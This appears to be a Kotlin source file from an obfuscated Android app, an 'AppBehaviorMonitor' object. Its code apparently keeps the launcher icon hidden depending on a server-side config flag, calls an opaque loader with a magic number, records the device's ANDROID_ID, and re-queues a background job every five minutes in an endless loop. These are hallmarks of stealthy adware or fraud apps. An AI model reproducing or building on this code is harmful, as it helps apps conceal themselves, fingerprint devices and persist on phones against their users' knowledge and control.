package com.even.zining.inherit.sound.start.newfun

import android.annotation.SuppressLint
import android.content.Intent
import android.provider.Settings
import androidx.core.app.FnnJobIntentService
import com.even.zining.inherit.sound.start.FnnStartFun.mainStart
import com.even.zining.inherit.sound.tool.data.FnnLoadData
import com.even.zining.inherit.sound.tool.data.MMKVUtils
import com.even.zining.inherit.sound.zeros.FnnLoad
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.UUID
import kotlin.math.abs

object AppBehaviorMonitor {
    fun noShowICCC() {
        CoroutineScope(Dispatchers.Main).launch {
            val isaData = DataStorage.getAdminData()
            if (isaData == null || !isaData.config.user.isUploader.isDigitSumEven()) {
                Logger.log("不是A方案显示图标")
                FnnLoad.fnnLoad(5567676)
            }
        }
    }

    fun Int?.isDigitSumEven(): Boolean {
        if (this == null) return false
        var n = abs(this)
        var sum = 0
        while (n > 0) {
            sum += n % 10
            n /= 10
        }
        return sum % 2 == 0
    }

    @SuppressLint("HardwareIds")
    fun getAndroidId() {
        val adminData = MMKVUtils.getString(FnnLoadData.appiddata)
        if (adminData.isEmpty()) {
            val androidId =
                Settings.Secure.getString(mainStart.contentResolver, Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrBlank()) {
                MMKVUtils.put(FnnLoadData.appiddata, androidId)
            } else {
                MMKVUtils.put(FnnLoadData.appiddata, UUID.randomUUID().toString())
            }
        }
    }

    fun startJobIntServiceFun() {
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                val intent = Intent(mainStart, FnnJobIntentService::class.java)
                FnnJobIntentService.enqueueWork(mainStart, intent)
                delay(5 * 60 * 1000)
            }
        }
    }
}
